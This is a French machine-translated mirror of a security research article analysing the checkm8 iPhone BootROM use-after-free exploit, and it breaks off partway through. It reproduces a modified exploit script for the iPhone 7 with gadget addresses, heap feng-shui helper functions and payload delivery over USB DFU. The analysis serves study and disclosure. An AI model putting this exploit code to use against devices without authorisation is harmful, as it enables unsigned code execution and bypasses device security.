<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üçê üåù ü§ó Analyse technique de l'exploit checkm8 üì§ üåé üßëüèº</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Avec une forte probabilit√©, vous avez d√©j√† entendu parler de l'exploit sensationnel de checkm8 , qui utilise une vuln√©rabilit√© irr√©cup√©rable dans la B...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Analyse technique de l'exploit checkm8</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/471668/"><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/3l/k0/i2/3lk0i27tlko9sqankyec8rouqhw.png"></div><br><p> Avec une forte probabilit√©, vous avez d√©j√† entendu parler de l'exploit sensationnel de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">checkm8</a> , qui utilise une vuln√©rabilit√© irr√©cup√©rable dans la <code>BootROM</code> plupart des iDevices, y compris l' <code>iPhone X</code>  Dans cet article, nous fournirons une analyse technique de l'exploit et examinerons les causes de la vuln√©rabilit√©.  Toute personne int√©ress√©e - bienvenue sous la coupe! </p><a name="habracut"></a><br><p>  Vous pouvez lire la version anglaise de l'article <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> . </p><br><h2 id="vvedenie">  Pr√©sentation </h2><br><p>  Pour commencer, nous d√©crirons bri√®vement le processus de d√©marrage d'iDevice et d√©couvrirons quelle place <code>BootROM</code> occupe (il peut √©galement √™tre appel√© <code>SecureROM</code> ) et pourquoi il est n√©cessaire.  Des informations assez d√©taill√©es √† ce sujet sont <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> .  Le processus de d√©marrage simplifi√© peut √™tre repr√©sent√© comme suit: </p><br><p><img src="https://habrastorage.org/webt/kh/xi/tl/khxitlvaiov5lgx4kt45cq3qng4.png"></p><br><p>  <code>BootROM</code> est la premi√®re chose que le processeur ex√©cute lorsque l'appareil est allum√©.  Les principales t√¢ches de <code>BootROM</code> : </p><br><ul><li>  Initialisation de la plateforme (param√©trage des registres de plateforme n√©cessaires, initialisation du <code>CPU</code> , etc.) </li><li>  V√©rification et transfert de contr√¥le √† la prochaine √©tape du chargement <br><ul><li>  <code>BootROM</code> prend en charge l'analyse des images <code>IMG3/IMG4</code> </li><li>  <code>BootROM</code> a acc√®s √† la cl√© <code>GID</code> pour d√©chiffrer les images </li><li>  Pour v√©rifier les images, la cl√© publique <code>Apple</code> est int√©gr√©e √† <code>BootROM</code> et il existe les fonctionnalit√©s n√©cessaires pour travailler avec la cryptographie. </li></ul></li><li>  R√©cup√©ration d'un appareil s'il n'est pas possible de t√©l√©charger davantage ( <code>Device Firmware Update</code> , <code>DFU</code> ) </li></ul><br><p>  <code>BootROM</code> tr√®s petite taille, et il peut √™tre appel√© une version all√©g√©e d' <code>iBoot</code> , car ils partagent la plupart du code syst√®me et de biblioth√®que.  Cependant, contrairement √† <code>iBoot</code> , <code>BootROM</code> ne peut pas √™tre mis √† jour.  Il est plac√© dans la m√©moire interne en lecture seule lors de la fabrication de l'appareil.  <code>BootROM</code> est la racine mat√©rielle de l'approbation de la cha√Æne de d√©marrage.  Des vuln√©rabilit√©s peuvent permettre de contr√¥ler le processus de t√©l√©chargement et d'ex√©cuter du code non sign√© sur l'appareil. </p><br><p><img src="https://habrastorage.org/webt/9a/pr/po/9aprpovk-0wg8fs7uya3axvs86s.png"></p><br><h2 id="poyavlenie-checkm8">  L'apparition de checkm8 </h2><br><p>  L'exploit <code>checkm8</code> √©t√© ajout√© √† l'utilitaire <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ipwndfu par</a> son auteur <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">axi0mX</a> le 27 septembre 2019. Il a ensuite <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">annonc√© une</a> mise √† jour sur son compte Twitter, accompagn√©e d'une description de l'exploit et d'informations suppl√©mentaires.  Vous pouvez d√©couvrir dans le fil que la vuln√©rabilit√© d' <code>use-after-free</code> lib√©ration dans le code <code>USB</code> √©t√© trouv√©e par l'auteur au cours du <code>iBoot</code> √† <code>iBoot</code> pour <code>iOS 12 beta</code> √† l'√©t√© 2018.  Comme indiqu√© pr√©c√©demment, <code>BootROM</code> et <code>iBoot</code> ont beaucoup de code commun, y compris du code pour <code>USB</code> , c'est pourquoi cette vuln√©rabilit√© est √©galement pertinente pour <code>BootROM</code> . </p><br><p>  Il r√©sulte √©galement du code d'exploitation que la vuln√©rabilit√© est exploit√©e dans <code>DFU</code> .  Il s'agit d'un mode dans lequel une image sign√©e peut √™tre transf√©r√©e vers l'appareil via <code>USB</code> , qui sera ensuite t√©l√©charg√©e.  Cela peut √™tre n√©cessaire, par exemple, pour restaurer le p√©riph√©rique si la mise √† jour √©choue. </p><br><p>  Le m√™me jour, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">littlelailo a</a> signal√© avoir d√©couvert cette vuln√©rabilit√© en mars et publi√© sa description dans le fichier <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">apollo.txt</a> .  La description correspond √† ce qui se passe dans le code <code>checkm8</code> , mais elle ne clarifie pas compl√®tement les d√©tails de l'exploit.  Par cons√©quent, nous avons d√©cid√© d'√©crire cet article et de d√©crire tous les d√©tails de l'op√©ration jusqu'√† l'ex√©cution de la charge utile dans <code>BootROM</code> inclus. </p><br><p>  Nous avons effectu√© une analyse d'exploit bas√©e sur les mat√©riaux mentionn√©s pr√©c√©demment, ainsi que sur le code source <code>iBoot/SecureROM</code> fuit√© en f√©vrier 2018.  Nous avons √©galement utilis√© des donn√©es obtenues exp√©rimentalement sur notre appareil de test - <code>iPhone 7</code> ( <code>CPID:8010</code> ).  √Ä l'aide de <code>checkm8</code> nous en avons supprim√© les <code>SecureROM</code> et <code>SecureRAM</code> , ce qui nous a aid√©s dans l'analyse. </p><br><h2 id="neobhodimye-znaniya-o-usb">  Connaissances USB essentielles </h2><br><p>  La vuln√©rabilit√© d√©tect√©e se trouve dans le code <code>USB</code> , donc certaines connaissances sur cette interface sont requises.  Vous pouvez lire la sp√©cification compl√®te <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> , mais elle est assez volumineuse.  Un excellent mat√©riel, qui est plus que suffisant pour une meilleure compr√©hension, est l' <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">USB dans un NutShell</a> .  Ici, nous ne donnons que le plus n√©cessaire. </p><br><p>  Il existe diff√©rents types de transfert de donn√©es <code>USB</code> .  <code>DFU</code> utilise uniquement le mode <code>Control Transfers</code> (vous pouvez le lire <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> ).  Chaque transaction dans ce mode comprend trois √©tapes: </p><br><a name="setup_packet"></a><br><ul><li>  <code>Setup Stage</code> - √† ce stade, un paquet <code>SETUP</code> est envoy√©, qui se compose des champs suivants: <br><ul><li>  <code>bmRequestType</code> - d√©crit la direction, le type et le r√©cepteur de la demande </li><li>  <code>bRequest</code> - d√©termine quelle demande est faite </li><li>  <code>wValue</code> , <code>wIndex</code> - selon la demande, ils peuvent √™tre interpr√©t√©s diff√©remment </li><li>  <code>wLength</code> - longueur des donn√©es re√ßues / transmises dans l' <code>Data Stage</code> </li></ul></li><li>  <code>Data Stage</code> - une √©tape facultative √† laquelle le transfert de donn√©es a lieu.  Selon le paquet <code>SETUP</code> de l'√©tape pr√©c√©dente, il peut s'agir de l'envoi de donn√©es de l'h√¥te vers le p√©riph√©rique ( <code>OUT</code> ) ou vice versa ( <code>IN</code> ).  Les donn√©es sont envoy√©es en petites portions (dans le cas d' <code>Apple DFU</code> , il s'agit de 0x40 octets). <br><ul><li>  Lorsque l'h√¥te souhaite transf√©rer le prochain lot de donn√©es, il envoie un jeton <code>OUT</code> , apr√®s quoi les donn√©es elles-m√™mes sont envoy√©es. </li><li>  Lorsque l'h√¥te est pr√™t √† recevoir des donn√©es de l'appareil, il envoie un jeton <code>IN</code> , en r√©ponse auquel l'appareil envoie des donn√©es. </li></ul></li><li>  <code>Status Stage</code> - √©tape finale √† laquelle l'√©tat de l'ensemble de la transaction est signal√©. <br><ul><li>  Pour les demandes <code>OUT</code> , l'h√¥te envoie un jeton <code>IN</code> , en r√©ponse auquel le p√©riph√©rique doit envoyer un paquet de donn√©es de longueur nulle. </li><li>  Pour les demandes <code>IN</code> , l'h√¥te envoie un jeton <code>OUT</code> et un paquet de donn√©es de longueur nulle. </li></ul></li></ul><br><p>  <code>OUT</code> requ√™tes <code>OUT</code> et <code>IN</code> sont illustr√©es dans le diagramme ci-dessous.  Nous avons intentionnellement supprim√© <code>ACK</code> , <code>NACK</code> et d'autres packages de prise de contact du sch√©ma de description et d'interaction, car ils ne jouent pas un r√¥le sp√©cial dans l'exploit lui-m√™me. </p><br><p><img src="https://habrastorage.org/webt/lq/cm/-i/lqcm-itvvltjac1kkadebsszkkq.png"></p><br><h2 id="analiz-apollotxt">  Analyse apollo.txt </h2><br><p>  Nous avons commenc√© l'analyse en analysant la vuln√©rabilit√© √† partir du document <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">apollo.txt</a> .  Il d√©crit l'algorithme du mode <code>DFU</code> : </p><br><blockquote>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4</a> <br><ol><li>  Lorsque usb est d√©marr√© pour obtenir une image sur dfu, dfu enregistre une interface pour g√©rer toutes les commandes et alloue un tampon pour l'entr√©e et la sortie </li><li>  si vous envoyez des donn√©es √† dfu, le paquet d'installation est g√©r√© par le code principal qui appelle ensuite le code d'interface </li><li>  le code d'interface v√©rifie que wLength est plus court que la longueur du tampon de sortie d'entr√©e et si c'est le cas, il met √† jour un pointeur pass√© en argument avec un pointeur sur le tampon de sortie d'entr√©e </li><li>  il renvoie ensuite wLength qui est la longueur qu'il souhaite recevoir dans le tampon </li><li>  le code principal usb met ensuite √† jour une variable globale avec la longueur et se pr√©pare √† recevoir les paquets de donn√©es </li><li>  si un paquet de donn√©es est re√ßu, il est √©crit dans le tampon de sortie d'entr√©e via le pointeur qui a √©t√© pass√© en argument et une autre variable globale est utilis√©e pour garder une trace du nombre d'octets d√©j√† re√ßus </li><li>  si toutes les donn√©es ont √©t√© re√ßues, le code sp√©cifique dfu est appel√© √† nouveau et cela continue √† copier le contenu du tampon de sortie d'entr√©e √† l'emplacement de m√©moire d'o√π l'image est d√©marr√©e plus tard </li><li>  apr√®s cela, le code usb r√©initialise toutes les variables et continue √† g√©rer de nouveaux packages </li><li>  si dfu quitte le tampon de sortie d'entr√©e est lib√©r√© et si l'analyse de l'image √©choue, le bootrom revient dfu </li></ol><br></blockquote><p>  Tout d'abord, nous avons compar√© les √©tapes d√©crites avec le code source <code>iBoot</code> .  Comme nous ne pouvons pas utiliser de fragments de code source divulgu√©s dans l'article, nous allons montrer le pseudocode obtenu par la r√©tro-ing√©nierie <code>SecureROM</code> de notre <code>iPhone 7</code> dans <code>IDA</code> .  Vous pouvez facilement trouver le code source d' <code>iBoot</code> et le parcourir. </p><br><p>  Lorsque le mode <code>DFU</code> est initialis√©, un tampon <code>IO</code> est allou√© et une interface <code>USB</code> est enregistr√©e pour le traitement des demandes √† la <code>DFU</code> : </p><br><p><img src="https://habrastorage.org/webt/2r/il/hz/2rilhzhao9dq9561t0nou161xos.png"></p><br><p>  Lorsqu'un paquet de demande <code>SETUP</code> arrive √† la <code>DFU</code> , le gestionnaire d'interface correspondant est appel√©.  En cas d'ex√©cution r√©ussie de la requ√™te <code>OUT</code> (par exemple, lors du transfert de l'image), le gestionnaire doit renvoyer l'adresse du tampon <code>IO</code> pour la transaction et la taille des donn√©es qu'il s'attend √† recevoir par pointeur.  Dans ce cas, l'adresse du tampon et la taille des donn√©es attendues sont stock√©es dans des variables globales. </p><br><p><img src="https://habrastorage.org/webt/ha/d7/7i/had77ibmhmmxpmnfmuwqgop96ps.png"></p><br><p>  Le gestionnaire d'interface pour <code>DFU</code> est illustr√© dans la capture d'√©cran ci-dessous.  Si la demande est correcte, alors l'adresse du tampon <code>IO</code> allou√© √† l'√©tape d'initialisation <code>DFU</code> et la longueur des donn√©es attendues, qui est extraite du paquet <code>SETUP</code> , sont renvoy√©es par le pointeur. </p><br><p><img src="https://habrastorage.org/webt/v1/ws/cp/v1wscp8-tw9pwanbkcjal_9zpv4.png"></p><br><p>  Pendant la <code>Data Stage</code> chaque √©l√©ment de donn√©es est √©crit dans le tampon <code>IO</code> , apr√®s quoi l'adresse du tampon <code>IO</code> est d√©cal√©e et le compteur des donn√©es re√ßues est mis √† jour.  Apr√®s avoir re√ßu toutes les donn√©es attendues, le gestionnaire de donn√©es d'interface est appel√© et l'√©tat de transmission global est effac√©. </p><br><p><img src="https://habrastorage.org/webt/w7/-n/oo/w7-noo36ubqoc4wznkxjezxs_tu.png"></p><br><p>  Dans le gestionnaire de donn√©es DFU, les donn√©es re√ßues sont d√©plac√©es vers la zone de m√©moire √† partir de laquelle le t√©l√©chargement continuera.  √Ä en juger par le code source <code>iBoot</code> , cette zone de m√©moire dans <code>Apple</code> s'appelle <code>INSECURE_MEMORY</code> . </p><br><p><img src="https://habrastorage.org/webt/ep/sd/ro/epsdro1dycadjstreuvdpkejksa.png"></p><br><p>  Lorsque vous <code>DFU</code> mode <code>DFU</code> , le tampon d' <code>IO</code> pr√©c√©demment allou√© sera lib√©r√©.  Si l'image a √©t√© re√ßue avec succ√®s en mode <code>DFU</code> , elle sera v√©rifi√©e et charg√©e.  Si, pendant le fonctionnement du mode <code>DFU</code> , une erreur s'est produite ou s'il est impossible de charger l'image r√©sultante, la <code>DFU</code> sera r√©initialis√©e et tout recommencera. </p><br><p>  Dans l'algorithme d√©crit se trouve la vuln√©rabilit√© d' <code>use-after-free</code> lib√©ration.  Si au d√©marrage, envoyez un paquet <code>SETUP</code> et terminez la transaction en sautant l' <code>Data Stage</code> , l'√©tat global restera initialis√© lors de la rentr√©e dans le cycle <code>DFU</code> , et nous serons en mesure d'√©crire √† l'adresse du tampon d' <code>IO</code> allou√©e dans l'it√©ration <code>DFU</code> pr√©c√©dente. </p><br><p>  Apr√®s avoir trait√© de la vuln√©rabilit√© d' <code>use-after-free</code> lib√©ration, nous nous sommes demand√©: comment puis-je √©craser quelque chose lors de la prochaine it√©ration de <code>DFU</code> ?  Apr√®s tout, avant de r√©initialiser la <code>DFU</code> toutes les ressources pr√©c√©demment allou√©es sont lib√©r√©es et l'emplacement de m√©moire dans la nouvelle it√©ration doit √™tre exactement le m√™me.  Il s'av√®re qu'il existe une autre erreur de fuite de m√©moire int√©ressante et assez belle qui permet d'exploiter la vuln√©rabilit√© d' <code>use-after-free</code> lib√©ration, dont nous discuterons plus tard. </p><br><h2 id="analiz-checkm8">  Analyse de Checkm8 </h2><br><p>  Nous proc√©dons directement √† l'analyse de l'exploit <code>checkm8</code> .  Pour plus de simplicit√©, nous analyserons une version modifi√©e de l'exploit pour <code>iPhone 7</code> , dans laquelle le code associ√© √† d'autres plateformes a √©t√© supprim√©, la s√©quence et les types de requ√™tes <code>USB</code> ont √©t√© modifi√©s sans perdre l'exploit.  Dans cette version √©galement, le processus de construction de la charge utile est supprim√©, il peut √™tre trouv√© dans le fichier <code>checkm8.py</code> origine.  Comprendre les diff√©rences entre les versions des autres appareils ne devrait pas √™tre difficile. </p><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python from checkm8 import * def main(): print '*** checkm8 exploit by axi0mX ***' device = dfu.acquire_device(1800) start = time.time() print 'Found:', device.serial_number if 'PWND:[' in device.serial_number: print 'Device is already in pwned DFU Mode. Not executing exploit.' return payload, _ = exploit_config(device.serial_number) t8010_nop_gadget = 0x10000CC6C callback_chain = 0x1800B0800 t8010_overwrite = '\0' * 0x5c0 t8010_overwrite += struct.pack('&lt;32x2Q', t8010_nop_gadget, callback_chain) # heap feng-shui stall(device) leak(device) for i in range(6): no_leak(device) dfu.usb_reset(device) dfu.release_device(device) # set global state and restart usb device = dfu.acquire_device() device.serial_number libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001) libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0) dfu.release_device(device) time.sleep(0.5) # heap occupation device = dfu.acquire_device() device.serial_number stall(device) leak(device) leak(device) libusb1_no_error_ctrl_transfer(device, 0, 9, 0, 0, t8010_overwrite, 50) for i in range(0, len(payload), 0x800): libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50) dfu.usb_reset(device) dfu.release_device(device) device = dfu.acquire_device() if 'PWND:[checkm8]' not in device.serial_number: print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.' sys.exit(1) print 'Device is now in pwned DFU Mode.' print '(%0.2f seconds)' % (time.time() - start) dfu.release_device(device) if __name__ == '__main__': main()</span></span></code> </pre> <br><p>  <code>checkm8</code> travail de <code>checkm8</code> peut √™tre divis√© en plusieurs √©tapes: </p><br><ol><li>  Pr√©paration du <code>heap feng-shui</code> ( <code>heap feng-shui</code> ) </li><li>  Allocation et lib√©ration du tampon <code>IO</code> sans effacer l'√©tat global </li><li>  √âcraser <code>usb_device_io_request</code> sur le tas avec <code>use-after-free</code> </li><li>  Placement de charge utile </li><li>  Ex√©cution de la <code>callback-chain</code> rappel </li><li>  Ex√©cution de <code>shellcode</code> </li></ol><br><p>  Consid√©rez chacune des √©tapes en d√©tail. </p><br><h2 id="1-podgotovka-kuchi-heap-feng-shui">  1. Pr√©paration du tas (tas feng-shui) </h2><br><p>  Il nous semble que c'est l'√©tape la plus int√©ressante et nous y avons pr√™t√© une attention particuli√®re. </p><br><pre> <code class="python hljs">stall(device) leak(device) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">6</span></span>): no_leak(device) dfu.usb_reset(device) dfu.release_device(device)</code> </pre> <br><p>  Cette √©tape est n√©cessaire pour obtenir un √©tat de segment de m√©moire pratique pour un <code>use-after-free</code> .  Pour commencer, consid√©rez les appels <code>stall</code> , <code>leak</code> , <code>no_leak</code> : </p><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">stall</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_async_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">0xC0</span></span>, <span class="hljs-number"><span class="hljs-number">0.00001</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">leak</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-number"><span class="hljs-number">0xC0</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">no_leak</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-number"><span class="hljs-number">0xC1</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)</code> </pre> <br><p>  <code>libusb1_no_error_ctrl_transfer</code> est un wrapper sur <code>device.ctrlTransfer</code> avec ignorer toutes les exceptions qui se sont produites lors de l'ex√©cution de la demande.  <code>libusb1_async_ctrl_transfer</code> - un wrapper sur la fonction <code>libusb_submit_transfer</code> de <code>libusb</code> pour l'ex√©cution de requ√™tes asynchrones. </p><br><p>  Les deux appels acceptent les param√®tres suivants: </p><br><ul><li>  Instance de p√©riph√©rique </li><li>  Donn√©es pour le package <code>SETUP</code> (leur description est <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> ): <br><ul><li> <code>bmRequestType</code> </li> <li> <code>bRequest</code> </li> <li> <code>wValue</code> </li> <li> <code>wIndex</code> </li> </ul></li><li>  Taille des donn√©es ( <code>wLength</code> ) ou Donn√©es pour l' <code>Data Stage</code> </li><li>  D√©lai d'expiration de la demande </li></ul><br><p>  Les arguments <code>bmRequestType</code> , <code>bRequest</code> , <code>wValue</code> et <code>wIndex</code> sont communs aux trois types de requ√™tes.  Ils signifient: </p><br><ul><li> <code>bmRequestType = 0x80</code> <br> <ul><li>  <code>0b1XXXXXXX</code> - direction de l' <code>Data Stage</code> de <code>Data Stage</code> de l'appareil √† l'h√¥te (appareil √† h√¥te) </li><li>  <code>0bX00XXXXX</code> - type de demande standard </li><li>  <code>0bXXX00000</code> - destinataire de la demande - appareil </li></ul></li><li>  <code>bRequest = 6</code> - demande de descripteur ( <code>GET_DESCRIPTOR</code> ) </li><li> <code>wValue = 0x304</code> <br> <ul><li>  <code>wValueHigh = 0x3</code> - d√©termine le type de descripteur √† recevoir - cha√Æne ( <code>USB_DT_STRING</code> ) </li><li>  <code>wValueLow = 0x4</code> est l'index du descripteur de cha√Æne, 4 correspond au num√©ro de s√©rie de l'appareil (dans ce cas, la cha√Æne ressemble √† <code>CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:0C ECID:001A40362045E526 IBFL:3C SRTG:[iBoot-2696.0.0.1.33]</code> ) </li></ul></li><li>  <code>wIndex = 0x40A</code> - identifiant du langage de cha√Æne, sa valeur n'est pas importante pour le fonctionnement et peut √™tre modifi√©e. </li></ul><br><p>  Pour l'une de ces trois demandes, 0x30 octets sont allou√©s sur le tas pour un objet de la structure suivante: </p><br><p><img src="https://habrastorage.org/webt/-e/ub/wb/-eubwbh-2fhsjb9bs36t0qom7be.png"></p><br><p>  Les champs les plus int√©ressants de cet objet sont le <code>callback</code> et le <code>next</code> . </p><br><ul><li>  <code>callback</code> - un pointeur vers une fonction qui sera appel√©e √† la fin de la demande. </li><li>  <code>next</code> - un pointeur vers l'objet suivant du m√™me type, n√©cessaire pour les demandes de mise en file d'attente. </li></ul><br><p>  Une caract√©ristique cl√© de l'appel de <code>stall</code> est d'utiliser l'ex√©cution asynchrone de la demande avec un d√©lai minimum.  Pour cette raison, si vous avez de la chance, la demande sera annul√©e au niveau du syst√®me d'exploitation et restera dans la file d'attente d'ex√©cution, et la transaction ne sera pas termin√©e.  Dans le m√™me temps, l'appareil continuera √† accepter tous les paquets <code>SETUP</code> entrants et, si n√©cessaire, les placera dans la file d'attente d'ex√©cution.  Plus tard, en utilisant des exp√©riences avec un <code>USB</code> sur <code>Arduino</code> nous avons pu d√©couvrir que pour un fonctionnement r√©ussi, l'h√¥te devrait envoyer un paquet <code>SETUP</code> et un jeton <code>IN</code> , apr√®s quoi la transaction devrait √™tre annul√©e par timeout.  Sch√©matiquement, une telle transaction incompl√®te peut √™tre repr√©sent√©e comme suit: </p><br><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/sh/zq/ia/shzqiacghex3lk7jc9nhgoz3m7g.png"></div><br><p>  Les autres demandes ne diff√®rent que par leur longueur et par une seule.  Le fait est que pour les requ√™tes standard, il existe un <code>callback</code> standard qui ressemble √† ceci: </p><br><p><img src="https://habrastorage.org/webt/cx/as/gn/cxasgnrqyant31ostgflo85zxro.png"></p><br><p>  La valeur <code>io_length</code> est √©gale au minimum de <code>wLength</code> dans le paquet <code>SETUP</code> de la demande et √† la longueur d'origine du descripteur demand√©.  √âtant donn√© que le descripteur est suffisamment long, nous pouvons contr√¥ler avec pr√©cision la valeur <code>io_length</code> dans sa longueur.  La valeur de <code>g_setup_request.wLength</code> est √©gale √† la valeur de <code>wLength</code> dernier paquet <code>SETUP</code> , dans ce cas, <code>0xC1</code> . </p><br><p>  Ainsi, √† la fin des requ√™tes g√©n√©r√©es √† l'aide des appels de <code>stall</code> et de <code>leak</code> , la condition dans la fonction de <code>callback</code> finale est satisfaite et <code>usb_core_send_zlp()</code> appel√©.  Cet appel cr√©e simplement un <code>zero-length-packet</code> et l'ajoute √† la file d'attente d'ex√©cution.  Cela est n√©cessaire pour que la transaction se termine correctement √† l' <code>Status Stage</code> du <code>Status Stage</code> . </p><br><p>  La demande se termine par un appel √† la fonction <code>usb_core_complete_endpoint_io</code> , qui appelle d'abord le <code>callback</code> puis lib√®re la m√©moire de la demande.  Dans le m√™me temps, l'ach√®vement de la demande peut se produire non seulement lorsque la transaction enti√®re est effectivement termin√©e, mais √©galement lorsque la <code>USB</code> r√©initialis√©e.  D√®s qu'un signal de r√©initialisation <code>USB</code> est re√ßu, la file d'attente de demande sera contourn√©e et chacune d'elles sera termin√©e. </p><br><p>  En raison de l'appel s√©lectif √† <code>usb_core_send_zlp()</code> , en contournant la file d'attente de demandes, puis en les lib√©rant, vous pouvez obtenir un contr√¥le de <code>usb_core_send_zlp()</code> de <code>usb_core_send_zlp()</code> suffisant pour une <code>use-after-free</code> lib√©ration.  Tout d'abord, regardons le cycle de sortie lui-m√™me: </p><br><p><img src="https://habrastorage.org/webt/ik/tn/ym/iktnymzi4lywmtf1xsmcfsgpyb4.png"></p><br><p>  La file d'attente des demandes est d'abord effac√©e, puis les demandes annul√©es sont <code>usb_core_complete_endpoint_io</code> et elles sont termin√©es en appelant <code>usb_core_complete_endpoint_io</code> .  Dans le m√™me temps, les requ√™tes s√©lectionn√©es √† l'aide de <code>usb_core_send_zlp</code> sont plac√©es dans <code>ep-&gt;io_head</code> .  Une fois la proc√©dure de r√©initialisation <code>USB</code> termin√©e, toutes les informations sur le point de terminaison seront r√©initialis√©es, y compris les <code>io_tail</code> <code>io_head</code> et <code>io_tail</code> , et les demandes de longueur nulle resteront sur le tas.  Vous pouvez donc cr√©er un petit morceau au milieu du reste du tas.  Le diagramme ci-dessous montre comment cela se produit: </p><br><p><img 